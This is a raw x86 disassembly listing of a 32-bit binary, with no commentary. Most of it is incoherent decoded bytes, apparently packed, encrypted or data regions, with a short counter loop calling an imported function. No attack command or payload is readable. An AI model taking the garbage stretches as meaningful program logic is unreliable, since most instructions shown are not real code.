  41109e:	jp     0x4110e8
  4110a0:	mov    bh,0xf9
  4110a2:	cdq    
  4110a3:	push   es
  4110a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110a5:	or     esi,DWORD PTR [ecx-0x72d64132]
  4110ab:	lea    esi,ds:[edi-0x34]
  4110af:	ret    0x51c
  4110b2:	xchg   edi,eax
  4110b3:	lods   eax,DWORD PTR ds:[esi]
  4110b4:	inc    edi
  4110b5:	outs   dx,BYTE PTR ds:[esi]
  4110b6:	out    0x38,al
  4110b8:	in     al,0x20
  4110ba:	jo     0x411070
  4110bc:	pop    edx
  4110bd:	bound  ecx,QWORD PTR [ebp-0x6bda5bd2]
  4110c3:	sub    edx,DWORD PTR [esi]
  4110c5:	push   ebx
  4110c6:	jmp    0x17af:0xdb79dbc6
  4110cd:	jg     0x4110bd
  4110cf:	lea    ebp,[ecx-0x25]
  4110d2:	into   
  4110d3:	je     0x41111b
  4110d5:	aas    
  4110d6:	jmp    0xe330e545
  4110db:	xchg   ebp,esi
  4110dd:	out    0x90,eax
  4110df:	call   0xdb17:0x9a56a659
  4110e6:	pusha  
  4110e7:	fwait
  4110e8:	mov    eax,ds:0xdae1865f
  4110ed:	fwait
  4110ee:	jno    0x4110a9
  4110f0:	inc    esi
  4110f1:	fild   WORD PTR [esi-0x50]
  4110f4:	and    eax,0x2be86308
  4110f9:	add    edx,DWORD PTR [eax]
  4110fb:	inc    esi
  4110fc:	stos   DWORD PTR es:[edi],eax
  4110fd:	sbb    dh,ch
  4110ff:	scas   eax,DWORD PTR es:[edi]
  411100:	shl    BYTE PTR [ebx+0x4b],1
  411103:	in     al,0xd2
  411105:	add    al,0xef
  411107:	add    bl,BYTE PTR [edi]
  411109:	cmp    al,BYTE PTR [edx+eiz*2+0x6907778f]
  411110:	xor    eax,0x6ad850d2
  411115:	les    ecx,FWORD PTR [esi*4-0x5602a083]
  41111c:	sbb    al,0x33
  41111e:	into   
  41111f:	xchg   BYTE PTR [ecx],ch
  411121:	pop    ss
  411122:	cld    
  411123:	je     0x411183
  411125:	scas   eax,DWORD PTR es:[edi]
  411126:	sub    DWORD PTR es:[ecx],ecx
  411129:	scas   al,BYTE PTR es:[edi]
  41112a:	outs   dx,DWORD PTR ds:[esi]
  41112b:	add    dh,BYTE PTR [edi+ecx*1]
  41112e:	xor    eax,0x82937835
  411133:	call   0x9f4f:0x29fe31c
  41113a:	(bad)  
  41113b:	jns    0x411123
  41113d:	add    al,0xad
  41113f:	popa   
  411140:	pop    esp
  411141:	call   esi
  411143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411144:	in     al,dx
  411145:	(bad)  
  411147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411148:	imul   esi,ebx,0x325ee5c8
  41114e:	retf   0xe696
  411151:	push   0xa911be5
  411156:	xor    dl,bh
  411158:	call   0x7c4f:0xa728cdd0
  41115f:	or     al,BYTE PTR ds:0x27d84bbc
  411165:	cli    
  411166:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411169:	sub    DWORD PTR [eax],0xffffff9f
  41116c:	adc    eax,0x47c2766a
  411171:	loope  0x411134
  411173:	outs   dx,BYTE PTR ds:[esi]
  411174:	aaa    
  411175:	jne    0x4111e8
  411177:	inc    ebx
  411178:	repnz pop ecx
  41117a:	scas   al,BYTE PTR es:[edi]
  41117b:	jecxz  0x4111f1
  41117d:	mul    BYTE PTR [edx+0x4e]
  411180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411181:	mov    dh,0x82
  411183:	pop    edi
  411184:	inc    eax
  411185:	mov    bh,bh
  411187:	scas   al,BYTE PTR es:[edi]
  411188:	loop   0x411185
  41118a:	mov    eax,0x181e8520
  41118f:	out    0xf0,al
  411191:	and    eax,0x909bb976
  411196:	lds    edi,FWORD PTR [edi]
  411198:	loopne 0x41116f
  41119a:	stc    
  41119b:	mov    ds:0xd4282919,eax
  4111a0:	and    DWORD PTR [ebp-0x2ab6baf8],edx
  4111a6:	imul   eax,DWORD PTR [edi+0x3a87b54f],0x72
  4111ad:	adc    esp,DWORD PTR [edi-0x744b8e7b]
  4111b3:	cld    
  4111b4:	push   ss
  4111b5:	cmp    al,0xc9
  4111b7:	xor    esi,DWORD PTR [edx]
  4111b9:	sbb    ebp,DWORD PTR [esi]
  4111bb:	xchg   ebx,eax
  4111bc:	push   ss
  4111bd:	or     eax,0x85af7943
  4111c2:	mul    BYTE PTR fs:[esi+0x25a4b15a]
  4111c9:	inc    edi
  4111ca:	add    dl,al
  4111cc:	repz inc eax
  4111ce:	popf   
  4111cf:	out    dx,eax
  4111d0:	aas    
  4111d1:	loopne 0x411243
  4111d3:	push   0xffffffe3
  4111d5:	jnp    0x4111e3
  4111d7:	int3   
  4111d8:	pushf  
  4111d9:	pop    esp
  4111da:	loop   0x41123d
  4111dc:	xor    eax,0x67443f46
  4111e1:	sbb    ebp,DWORD PTR [esi]
  4111e3:	pusha  
  4111e4:	pushf  
  4111e5:	mov    DWORD PTR [edx-0x65],esp
  4111e8:	and    BYTE PTR [edi+0x10],al
  4111eb:	sbb    BYTE PTR [ecx],al
  4111ed:	jmp    0x28ace85e
  4111f2:	jg     0x4111e5
  4111f4:	xchg   esi,eax
  4111f5:	inc    ebp
  4111f6:	fst    QWORD PTR [edx+edx*1-0x2e988acc]
  4111fd:	xchg   ebp,eax
  4111fe:	mov    eax,ds:0x4bf89bbb
  411203:	push   edi
  411204:	sbb    DWORD PTR [edi],0x38
  411207:	and    al,0xa6
  411209:	fld    TBYTE PTR [eax+0x48]
  41120c:	aas    
  41120d:	mov    ebx,0x1d376081
  411212:	repz xchg edi,eax
  411214:	xor    BYTE PTR [edi-0x7c3533],ch
  41121a:	push   cs
  41121b:	stc    
  41121c:	sbb    al,0x80
  41121e:	pop    esi
  41121f:	sbb    ebx,ebx
  411221:	fs add eax,0x2cc552f2
  411227:	out    0x5a,eax
  411229:	lds    edi,FWORD PTR [eax+0x37bc582d]
  41122f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411230:	push   0x36
  411232:	sub    eax,0x3c78ae16
  411237:	jg     0x411222
  411239:	mov    ebp,0x94d3e93b
  41123e:	lock push ecx
  411240:	cmp    dh,BYTE PTR [ebx+edi*1]
  411243:	sbb    DWORD PTR [ebx],ecx
  411245:	mov    al,ds:0x67a7345d
  41124a:	or     BYTE PTR [ebx],cl
  41124c:	jmp    0x411297
  41124e:	cvtps2pd xmm0,QWORD PTR [ebp+0x76]
  411252:	pusha  
  411253:	into   
  411254:	out    0x13,eax
  411256:	cmp    BYTE PTR [edi],dh
  411258:	push   ss
  411259:	jle    0x4112ce
  41125b:	dec    eax
  41125c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41125d:	sahf   
  41125e:	push   esp
  41125f:	jo     0x411254
  411261:	mov    bh,0x69
  411263:	mov    ch,0x45
  411265:	out    0x57,al
  411267:	mov    edx,0x577ec25b
  41126c:	idiv   esp
  41126e:	mov    edi,0xdaeb7f15
  411273:	(bad)  
  411274:	dec    edx
  411275:	sbb    eax,0x705f9f23
  41127a:	stos   BYTE PTR es:[edi],al
  41127b:	ret    0x993c
  41127e:	push   ds
  41127f:	ss push esp
  411281:	(bad)  
  411282:	loopne 0x411273
  411284:	test   DWORD PTR [esi+0x28c1c823],eax
  41128a:	mov    WORD PTR [esi],fs
  41128c:	fst    DWORD PTR [edi+0x3]
  41128f:	je     0x4112e5
  411291:	pop    ds
  411292:	data16 rcr dh,cl
  411295:	sub    bl,BYTE PTR [edi+0x5800e13b]
  41129b:	inc    ebx
  41129c:	lods   al,BYTE PTR ds:[esi]
  41129d:	rol    dl,cl
  41129f:	int    0xf4
  4112a1:	out    0x25,al
  4112a3:	pop    es
  4112a4:	or     DWORD PTR [edx+ebp*4-0xe56eaf4],edx
  4112ab:	iret   
  4112ac:	jne    0x4112ca
  4112ae:	sbb    dh,BYTE PTR [eax+0x31]
  4112b1:	outs   dx,BYTE PTR ds:[esi]
  4112b2:	adc    ebp,DWORD PTR ds:0x5dd1dbc0
  4112b8:	pop    ecx
  4112b9:	(bad)  
  4112ba:	and    ah,BYTE PTR [eax+0x6f]
  4112bd:	push   ds
  4112be:	sub    eax,0x653d5489
  4112c3:	int    0xf1
  4112c5:	and    esi,DWORD PTR [edx-0x73]
  4112c8:	out    dx,al
  4112c9:	xchg   esp,eax
  4112ca:	mov    esp,0x63fdbbda
  4112cf:	mov    dl,BYTE PTR [eax-0x3ddbed2]
  4112d5:	(bad)  
  4112d6:	mov    ds:0xf054d246,eax
  4112db:	jl     0x411347
  4112dd:	xchg   ecx,eax
  4112de:	dec    ebp
  4112df:	fsubp  st(5),st
  4112e1:	jl     0x411290
  4112e3:	repnz test BYTE PTR [ecx+eiz*1-0x1],dh
  4112e8:	sbb    bh,BYTE PTR [ebp-0x39b25605]
  4112ee:	sbb    eax,0x69d7a5a0
  4112f3:	sahf   
  4112f4:	mov    BYTE PTR [esi+ecx*8+0x7c],cl
  4112f8:	sbb    edi,DWORD PTR [esi]
  4112fa:	mov    es,eax
  4112fc:	pusha  
  4112fd:	int    0x23
  4112ff:	mov    edx,esp
  411301:	scas   al,BYTE PTR es:[edi]
  411302:	(bad)  
  411303:	cmp    bh,al
  411305:	pop    es
  411306:	inc    ecx
  411307:	into   
  411308:	addr16 mov ah,0xaf
  41130b:	adc    BYTE PTR [ecx+0x71cff91],al
  411311:	out    0xf6,eax
  411313:	imul   esp,ebp,0xd8908d6a
  411319:	push   ds
  41131a:	(bad)  
  41131b:	sbb    al,0x1d
  41131d:	sbb    edi,DWORD PTR [edx-0x78]
  411320:	jmp    0x4343:0xe8f20fed
  411327:	sbb    bl,BYTE PTR [edx+0x65]
  41132a:	test   DWORD PTR [ebx],eax
  41132c:	pop    ecx
  41132d:	addr16 aad 0x80
  411330:	push   ecx
  411331:	jne    0x4112b5
  411333:	mov    eax,DWORD PTR [edx-0x7a]
  411336:	mov    ds:0x4c91f27b,al
  41133b:	jbe    0x411341
  41133d:	outs   dx,DWORD PTR ds:[esi]
  41133e:	dec    eax
  41133f:	enter  0x93f2,0xf4
  411343:	(bad)  
  411344:	push   ebx
  411345:	cmp    eax,0x9215cc48
  41134a:	ins    BYTE PTR es:[edi],dx
  41134b:	cmp    eax,0x18b4dc31
  411350:	jge    0x411336
  411352:	enter  0x74b1,0x62
  411356:	and    ah,BYTE PTR [edx+0x2d1e07ba]
  41135c:	data16 into 
  41135e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41135f:	add    al,0x1f
  411361:	ret    0xc4dc
  411364:	dec    edx
  411365:	sbb    al,0xd1
  411367:	ins    DWORD PTR es:[edi],dx
  411368:	mov    ecx,0xf2ab7619
  41136d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41136e:	cmp    al,0xd3
  411371:	or     dh,bl
  411373:	retf   0x2a6a
  411376:	mov    ds:0xaa7cfa58,eax
  41137b:	push   esp
  41137c:	(bad)  [ecx-0x4da6b39b]
  411382:	lods   al,BYTE PTR ds:[esi]
  411383:	in     eax,0x37
  411385:	add    al,0x6a
  411387:	sub    esp,eax
  411389:	inc    ebp
  41138a:	add    al,0x1a
  41138c:	mov    cl,0xb1
  41138e:	xor    al,0x4b
  411390:	xor    al,0x3c
  411392:	mov    esi,0x333afe5
  411397:	bound  esp,QWORD PTR [esi]
  411399:	(bad)  
  41139b:	test   eax,0x728ee416
  4113a0:	test   al,0xc2
  4113a2:	(bad)  
  4113a3:	push   0x4
  4113a5:	imul   ecx,DWORD PTR ds:0x2e499542,0x6bb8dad7
  4113af:	xchg   esp,eax
  4113b0:	(bad)  
  4113b2:	sbb    al,BYTE PTR [edi-0x37c8250e]
  4113b8:	or     dh,BYTE PTR [ebx-0x32b9b225]
  4113be:	leave  
  4113bf:	enter  0x226,0x9e
  4113c3:	jmp    0x411400
  4113c5:	mov    bh,0x5
  4113c8:	jno    0x4113c6
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fcfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fcfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fcfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fcfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e167
  411404:	push   0x42e1ed
  411409:	call   DWORD PTR ds:0x42e4e7
  41140f:	cmp    DWORD PTR ds:0x42fcfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fcfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fcfa,esi
  411429:	cmp    DWORD PTR ds:0x42fcfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	lea    eax,[edi]
  411449:	or     DWORD PTR [eax+0x70704a0e],esp
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4114cb
  411454:	or     al,0x8a
  411456:	das    
  411457:	push   cs
  411458:	in     eax,dx
  411459:	mov    edx,0x46dd649e
  41145e:	adc    esi,esp
  411460:	mov    ch,0x49
  411462:	ret    0x3411
  411465:	xchg   esp,eax
  411466:	push   edi
  411467:	jmp    0xe7c0789e
  41146c:	fiadd  DWORD PTR [ebp+0x15d72351]
  411472:	or     ch,al
  411474:	in     al,0x99
  411476:	or     ebx,DWORD PTR [edi]
  411478:	fadd   QWORD PTR [edx+0x6b]
  41147b:	mov    DWORD PTR [eax],ebx
  41147d:	cmp    edi,0xffffffd6
  411480:	cld    
  411481:	mov    ah,0xa8
  411483:	les    edx,FWORD PTR [edi]
  411485:	push   edx
  411486:	mov    al,ds:0xfe5a2a04
  41148b:	adc    al,bl
  41148d:	sub    dh,al
  41148f:	add    dh,BYTE PTR [esi+0x75]
  411492:	(bad)  
  411493:	std    
  411494:	lea    esp,[esi+esi*2]
  411497:	cli    
  411498:	imul   ebp,DWORD PTR [eax+0x1eecb6a6],0xffffffc7
  41149f:	pop    es
  4114a0:	lods   al,BYTE PTR ds:[esi]
  4114a1:	imul   esp,ecx,0xfdb4804b
  4114a7:	imul   edi,DWORD PTR [esi+0x51],0xe1bbbd29
  4114ae:	out    dx,al
  4114af:	add    dl,BYTE PTR [edi+0xd]
  4114b2:	xor    DWORD PTR [ecx+0x4f],esi
  4114b5:	rol    DWORD PTR [edi],cl
  4114b7:	adc    al,0x81
  4114b9:	in     eax,dx
  4114ba:	xchg   DWORD PTR [ebx-0x7],edx
  4114bd:	loop   0x4114bd
  4114bf:	fmul   DWORD PTR [ebp+0x39847afd]
  4114c5:	xor    ebp,ebp
  4114c7:	aad    0x15
  4114c9:	aam    0xc0
  4114cb:	(bad)  [esi+0x360eb822]
  4114d1:	mov    WORD PTR [esi+0x48],ss
  4114d4:	popf   
  4114d5:	outs   dx,DWORD PTR ds:[esi]
  4114d6:	bound  edx,QWORD PTR [edx+0x542553cb]
  4114dc:	ins    DWORD PTR es:[edi],dx
  4114dd:	xchg   BYTE PTR ds:0xbb7cc023,ch
  4114e3:	popa   
  4114e4:	in     al,0xc4
  4114e6:	(bad)  
  4114e7:	faddp  st(2),st
  4114e9:	dec    ebx
  4114ea:	pop    edi
  4114eb:	jne    0x411532
  4114ed:	stos   BYTE PTR es:[edi],al
  4114ee:	add    al,0x30
  4114f0:	sti    
  4114f1:	sub    al,0x14
  4114f3:	rol    BYTE PTR [ecx-0x30],1
  4114f6:	adc    al,0x47
  4114f8:	pop    eax
  4114f9:	pop    ss
  4114fa:	scas   eax,DWORD PTR es:[edi]
  4114fb:	stos   BYTE PTR es:[edi],al
  4114fc:	or     ah,BYTE PTR [esi+0x56a0c1ff]
  411502:	pop    ecx
  411503:	dec    ebp
  411504:	xor    ecx,DWORD PTR [edi+0x79fa48c6]
  41150a:	sbb    edx,DWORD PTR [edi]
  41150c:	xor    BYTE PTR [edx],cl
  41150e:	imul   ebx,DWORD PTR [eax],0x7e
  411511:	(bad)  
  411513:	shl    BYTE PTR [ecx+0x1fa30653],1
  411519:	aaa    
  41151a:	push   0xb2c9ebdf
  41151f:	in     al,dx
  411520:	pushf  
  411521:	loop   0x4114cd
  411523:	cmc    
  411524:	cmp    DWORD PTR [esi-0x78],ecx
  411527:	cmp    DWORD PTR ds:0xe5bcb291,ecx
  41152d:	jne    0x4114e9
  41152f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411531:	ja     0x4114f4
  411533:	mov    ebx,0xd38a03be
  411538:	cdq    
  411539:	ud2    
  41153b:	retf   0xddfd
  41153e:	pop    eax
  41153f:	sub    esp,ebx
  411541:	mov    eax,ds:0x8efc9237
  411546:	fisubr DWORD PTR [ebx+0x12]
  411549:	lds    esi,FWORD PTR [ebx+eiz*1+0x61]
  41154d:	mov    al,0xab
  41154f:	test   eax,0x898031c4
  411554:	ror    DWORD PTR [esp+ecx*8],0xf9
  411558:	adc    eax,0xae985aff
  41155d:	jl     0x411554
  41155f:	push   cs
  411560:	push   edx
  411561:	xchg   DWORD PTR [ebp-0x215c602a],eax
  411567:	leave  
  411568:	mov    ebp,0xd1af1610
  41156d:	arpl   sp,cx
  41156f:	aaa    
  411570:	sti    
  411571:	jmp    0x869a5ca8
  411576:	je     0x4115f2
  411578:	cs xchg ebp,eax
  41157a:	xchg   ebp,eax
  41157b:	cmp    dh,BYTE PTR [eax+0x74]
  41157e:	mov    DWORD PTR [esi+esi*2],esi
  411581:	push   ds
  411582:	cdq    
  411583:	shr    DWORD PTR [ebx+edx*2+0x14ec4160],0x2d
  41158b:	xor    edi,esp
  41158d:	xchg   esi,eax
  41158e:	jg     0x41158b
  411590:	(bad)  
  411592:	sub    eax,edi
  411594:	jae    0x41155c
  411596:	out    0x53,al
  411598:	xor    eax,0x2b255c80
  41159d:	out    dx,eax
  41159e:	(bad)  
  41159f:	mov    ah,0x5e
  4115a1:	jo     0x4115c6
  4115a3:	scas   eax,DWORD PTR es:[edi]
  4115a4:	sbb    BYTE PTR [eax-0x5de349b9],bh
  4115aa:	mov    eax,0x9159d42c
  4115af:	jmp    0x4a57:0x1665486c
  4115b6:	add    BYTE PTR [esi+ecx*4+0x48022067],dh
  4115bd:	fwait
  4115be:	adc    DWORD PTR [esi+0x30],ebx
  4115c1:	arpl   WORD PTR [edi+0x3c],si
  4115c4:	mov    ebp,0xeca26016
  4115c9:	adc    bl,al
  4115cb:	ja     0x411601
  4115cd:	les    esp,FWORD PTR [edi-0x26]
  4115d0:	cwde   
  4115d1:	jmp    0xe7e7:0x2faecd27
  4115d8:	mov    ecx,0x35865463
  4115dd:	frstor [ebp+0xb49c60c]
  4115e3:	aad    0xf5
  4115e5:	push   edi
  4115e6:	xor    DWORD PTR [eax],0xb745ac9f
  4115ec:	shr    BYTE PTR [ebx],cl
  4115ee:	std    
  4115ef:	fist   WORD PTR [ecx+eax*8-0x698fbf71]
  4115f6:	push   ss
  4115f7:	outs   dx,DWORD PTR ds:[esi]
  4115f8:	inc    ebp
  4115f9:	rcl    DWORD PTR [edi],cl
  4115fb:	imul   edi,DWORD PTR [eax],0x9d2b634
  411601:	push   edi
  411602:	(bad)  
  411603:	dec    ebx
  411604:	sbb    ebx,DWORD PTR [edi]
  411606:	pop    ss
  411607:	test   BYTE PTR [edi+ebp*8-0x79f5e726],al
  41160e:	xor    eax,0xc9e0566a
  411613:	fiadd  WORD PTR [ecx]
  411615:	test   DWORD PTR [esi+0x21],edx
  411618:	(bad)  
  411619:	in     al,dx
  41161a:	scas   eax,DWORD PTR es:[edi]
  41161b:	sbb    ch,BYTE PTR [edi+0x70]
  41161e:	daa    
  41161f:	leave  
  411620:	(bad)  
  411621:	mov    al,ds:0xe0a9b59a
  411626:	sti    
  411627:	aas    
  411628:	repz out dx,al
  41162a:	push   edi
  41162b:	outs   dx,BYTE PTR ds:[esi]
  41162c:	das    
  41162d:	jne    0x411630
  41162f:	adc    BYTE PTR [edi],dh
  411631:	xchg   edx,eax
  411632:	or     DWORD PTR [esi],esp
  411634:	mov    dl,0x2
  411636:	cmp    dl,0x29
  411639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41163a:	xchg   edi,eax
  41163b:	lds    eax,FWORD PTR [ecx-0x7c]
  41163e:	out    0xfd,al
  411640:	push   ds
  411641:	mov    DWORD PTR [ecx-0x71396df5],esi
  411647:	ror    DWORD PTR [ecx+edi*2+0x3b3332fd],cl
  41164e:	inc    ebp
  41164f:	push   0xffffffcc
  411651:	push   ds
  411652:	jl     0x4115dc
  411654:	cdq    
  411655:	iret   
  411656:	jb     0x411662
  411658:	cdq    
  411659:	cld    
  41165a:	cmp    esp,DWORD PTR [edx+0x1d]
  41165d:	loopne 0x411603
  41165f:	jo     0x4115f9
  411661:	loopne 0x41161b
  411663:	xchg   BYTE PTR [eax+0x1c4245c3],ah
  411669:	xor    DWORD PTR [eax],edx
  41166b:	outs   dx,DWORD PTR ds:[esi]
  41166c:	mov    ebp,0x7d5a1cd9
  411671:	cmp    DWORD PTR [eax-0x23cfa139],esi
  411677:	scas   eax,DWORD PTR es:[edi]
  411678:	pop    esi
  411679:	cmp    al,0x36
  41167b:	mov    ch,0x54
  41167d:	enter  0x8831,0x38
  411681:	(bad)
  411686:	inc    edx
  411687:	jge    0x411659
  411689:	sub    eax,0x4fbecea1
  41168e:	aas    
  41168f:	cmp    dh,dl
  411691:	cli    
  411692:	pusha  
  411693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411694:	or     eax,0x76aaf56e
  411699:	mov    bh,0x3b
  41169b:	jbe    0x411681
  41169d:	mov    fs,WORD PTR [esi+0x15]
  4116a0:	(bad)  
  4116a1:	lea    ebx,[edi-0x14d26a75]
  4116a7:	fst    QWORD PTR [edi+0x17668ded]
  4116ad:	popf   
  4116ae:	pop    ebx
  4116af:	aas    
  4116b0:	push   cs
  4116b1:	mov    BYTE PTR [ecx-0x6e],ah
  4116b4:	cs ret 0x6f5a
  4116b8:	(bad)  
  4116ba:	push   esi
  4116bb:	stc    
  4116bc:	(bad)  
  4116bd:	adc    edi,ebx
  4116bf:	inc    edi
  4116c0:	push   0x908df8d8
  4116c5:	mov    ah,0xf6
  4116c7:	xor    al,bl
  4116c9:	sahf   
  4116ca:	jecxz  0x4116c7
  4116cc:	sbb    BYTE PTR [edx-0x80],al
  4116cf:	pop    ds
  4116d0:	jl     0x411741
  4116d2:	retf   0x83aa
  4116d5:	in     eax,0x22
  4116d7:	pop    ss
  4116d8:	sub    cl,dl
  4116da:	mov    eax,0x94e3f5ec
  4116df:	mov    ebx,0xb4bb61ff
  4116e4:	jbe    0x411680
  4116e6:	push   edx
  4116e7:	outs   dx,DWORD PTR ds:[esi]
  4116e8:	push   esi
  4116e9:	ja     0x41169b
  4116eb:	xchg   edi,eax
  4116ec:	jmp    FWORD PTR [eax+0x11]
  4116ef:	das    
  4116f0:	nop
  4116f1:	repz sbb al,0x28
  4116f4:	push   eax
  4116f5:	jne    0x4116be
  4116f7:	inc    esp
  4116f8:	pop    ds
  4116f9:	or     dl,BYTE PTR ds:0x2b15ce21
  4116ff:	into   
  411700:	dec    esp
  411701:	aam    0xc4
  411703:	sub    BYTE PTR [ecx],al
  411705:	push   ebp
  411706:	pop    edi
  411707:	jne    0x411748
  411709:	fmul   st(2),st
  41170b:	mov    ebp,0xbf047ce0
  411710:	inc    ebx
  411711:	rcl    BYTE PTR [edi],1
  411713:	mov    dl,0x82
  411715:	xchg   esi,eax
  411716:	test   DWORD PTR [ebp-0x1c],eax
  411719:	stc    
  41171a:	mov    es,WORD PTR [eax-0x66]
  41171d:	mov    bh,0xb0
  41171f:	ins    DWORD PTR es:[edi],dx
  411720:	lea    eax,[ebp-0xa047992]
  411726:	arpl   WORD PTR [ebp+0x6e],cx
  411729:	cld    
  41172a:	sub    BYTE PTR es:[esi+0x30c62859],cl
  411731:	mov    al,ds:0x9e22f50b
  411736:	loope  0x4116ba
  411738:	and    ebx,DWORD PTR [esi-0x3b450cab]
  41173e:	fild   WORD PTR [edi+0x21]
  411741:	mov    eax,0x4fe13dcc
  411746:	jmp    0x76f:0x95770b6
  41174d:	push   ebx
  41174e:	dec    esi
  41174f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411750:	mov    al,ds:0x4584939
  411755:	popf   
  411756:	sub    eax,0x60c8c27d
  41175b:	xchg   ebp,eax
  41175c:	jp     0x41175e
  41175e:	add    BYTE PTR [edi],bh
  411760:	mov    edi,0x2cce7561
  411765:	loopne 0x4116f9
  411767:	push   ss
  411768:	aad    0xda
  41176a:	test   DWORD PTR [edx+0x42],esi
  41176d:	mov    cs,edx
  41176f:	leave  
  411770:	dec    ebx
  411771:	mov    al,0x38
  411773:	andps  xmm0,XMMWORD PTR [esi+0x57]
  411777:	adc    eax,0xd4c06918
  41177c:	lock loope 0x411786
  41177f:	or     esi,DWORD PTR [eax-0x66]
  411782:	cld    
  411783:	mov    ds:0xadd78705,eax
  411788:	and    eax,0xa9994246
  41178d:	and    eax,0x87e2c13a
  411792:	xor    ch,dh
  411794:	out    dx,eax
  411795:	iret   
  411796:	je     0x4117fe
  411798:	hlt    
  411799:	push   ebp
  41179a:	int3   
  41179b:	or     al,0xd4
  41179d:	jecxz  0x411779
  41179f:	push   0xffffffc6
  4117a1:	xor    ah,BYTE PTR [eax]
  4117a3:	push   0xffffff93
  4117a5:	xchg   ebp,eax
  4117a6:	mov    al,0xec
  4117a8:	hlt    
  4117a9:	jle    0x41177e
  4117ab:	es iret 
  4117ad:	jbe    0x411740
  4117af:	ins    BYTE PTR es:[edi],dx
  4117b0:	or     eax,0x7712e92f
  4117b5:	jo     0x411790
  4117b7:	popf   
  4117b8:	or     dh,dl
  4117ba:	xor    BYTE PTR [edx],ah
  4117bc:	inc    ebx
  4117bd:	ret    0x4fae
  4117c0:	fcomp  DWORD PTR [edx+0xc]
  4117c3:	(bad)  
  4117c4:	call   FWORD PTR [eax-0x63]
  4117c7:	jo     0x411845
  4117c9:	mov    ds:0x7c07c9c1,al
  4117ce:	mov    ch,0xec
  4117d0:	inc    edx
  4117d1:	mov    edx,0x63d6f8eb
  4117d6:	sbb    eax,0x7e1f876c
  4117db:	nop
  4117dc:	pop    ds
  4117dd:	xlat   BYTE PTR ds:[ebx]
  4117de:	mov    bl,0x50
  4117e0:	addr16 icebp 
  4117e2:	(bad)  
  4117e3:	sbb    edi,DWORD PTR [eax+ecx*8-0x5da1ac48]
  4117ea:	inc    ecx
  4117eb:	scas   eax,DWORD PTR es:[edi]
  4117ec:	setge  BYTE PTR [ecx]
  4117ef:	lahf   
  4117f0:	fimul  DWORD PTR [esi]
  4117f2:	in     al,0x2e
  4117f4:	mov    eax,0x71f8d03
  4117f9:	scas   al,BYTE PTR es:[edi]
  4117fa:	mov    bl,0x29
  4117fc:	and    al,0x49
  4117fe:	out    0x9c,eax
  411800:	jbe    0x41182c
  411802:	imul   edx,DWORD PTR [ecx+0x646059f4],0x33c8e42a
  41180c:	mov    esi,edx
  41180e:	fbstp  TBYTE PTR [ecx]
  411810:	stc    
  411811:	push   0x5d
  411813:	sub    ebx,DWORD PTR [esi+0x4b]
  411816:	xchg   ebp,eax
  411817:	stos   DWORD PTR es:[edi],eax
  411818:	mov    esp,0x7858fd71
  41181d:	(bad)  
  41181e:	dec    ebp
  41181f:	inc    eax
  411820:	iret   
  411821:	pop    ebp
  411822:	ja     0x41184b
  411824:	loopne 0x411832
  411826:	xchg   edi,eax
  411827:	loope  0x4117f9
  411829:	ja     0x4117b5
  41182b:	outs   dx,BYTE PTR ds:[esi]
  41182c:	cwde   
  41182d:	mov    WORD PTR [ecx-0x5947209f],?
  411833:	pusha  
  411834:	or     BYTE PTR [eax+ecx*8-0x3bec361b],bl
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fc75,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fcfa,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fcf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x51adc9e9],dl
  41187c:	shl    DWORD PTR [esi+0x57],0x70
  411880:	jo     0x4118da
  411882:	jge    0x4118f4
  411884:	jo     0x411883
  411886:	xlat   BYTE PTR ds:[ebx]
  411887:	aam    0x74
  411889:	mov    dh,0x6b
  41188b:	or     al,dl
  41188d:	clc    
  41188e:	shl    BYTE PTR [ebx+0x45],0x42
  411892:	pop    esi
  411893:	test   DWORD PTR [eax+esi*4+0x1d],edx
  411897:	xchg   esi,eax
  411898:	shl    BYTE PTR [eax+0x34],cl
  41189b:	dec    ebp
  41189c:	jmp    0xc09693d4
  4118a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a2:	(bad)  
  4118a3:	ror    edi,cl
  4118a5:	imul   esp,DWORD PTR [eax+0x8097bc2],0xc601dd18
  4118af:	add    BYTE PTR [edx+0xfdc102b],bh
  4118b5:	mov    ch,BYTE PTR [ebx]
